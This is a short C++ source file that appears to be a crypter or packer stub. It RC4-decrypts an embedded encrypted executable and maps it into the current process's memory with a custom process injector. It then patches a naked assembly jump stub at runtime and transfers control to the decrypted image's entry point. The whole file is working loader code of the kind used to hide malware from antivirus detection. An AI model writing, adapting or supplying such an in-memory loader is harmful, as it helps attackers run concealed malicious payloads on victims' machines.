#include "common.h"
#include "process_injector.h"
#include "ARC4.h"

extern std::string key;

extern uint64_t file_size;

extern uint8_t encrypted_file[];


__declspec(naked) void do_jmp()
{
	__asm
	{
#ifndef WIN64
		mov eax, 12345678h
		jmp eax
#else
		mov rax, 1234567812345678h
		jmp rax
#endif // WIN64
	}
}



int main()
{
	ARC4		arc4;
	uint8_t*	dec = (uint8_t*)malloc(file_size * sizeof(uint8_t) + 1);
	DWORD		old_protection;

	arc4.setKey((unsigned char*)key.c_str(), key.length());

	arc4.encrypt(encrypted_file, dec, file_size);

	process_injector_t* proc_injector = process_injector_t::get_instance(dec, GetCurrentProcess(), NULL);

	if (!proc_injector->inject_into_process())
		return -1;

	if (!proc_injector->set_sections_protections())
		return -1;

	uintptr_t* pointer = (uintptr_t*)((uintptr_t)do_jmp + 1);

	uintptr_t value_to_write = (uintptr_t)((uintptr_t)proc_injector->base_address() + proc_injector->entry_point());

	VirtualProtect(
		do_jmp,
		1,
		PAGE_EXECUTE_READWRITE,
		&old_protection
	);

	(*pointer) = value_to_write;

	VirtualProtect(
		do_jmp,
		1,
		old_protection,
		&old_protection
	);

	do_jmp();
}
